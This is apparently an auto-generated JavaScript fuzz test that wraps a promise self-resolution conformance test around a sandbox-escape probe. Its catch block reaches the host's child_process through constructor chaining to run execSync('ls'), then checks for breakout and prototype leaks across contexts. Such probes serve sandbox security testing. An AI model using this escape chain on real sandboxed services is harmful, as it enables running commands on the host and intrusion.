try {
    var resolve;
    var p1 = new Promise(function (_resolve) {
        let REPLACER = 23;
        resolve = _resolve;
    });
    var p2;
    p2 = p1.then(function () {
        let REPLACER = 23;
        return p2;
    });
    p2.then(function () {
        throw () => {
            return () => {
            };
        };
        $DONE('The promise should not be fulfilled.');
    }, function (reason) {
        if (!reason) {
            $DONE('The promise should be rejected with a value.');
            return;
        }
        if (reason.constructor !== TypeError) {
            $DONE('The promise should be rejected with a TypeError instance.');
            return;
        }
        $DONE();
    });
    resolve();
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}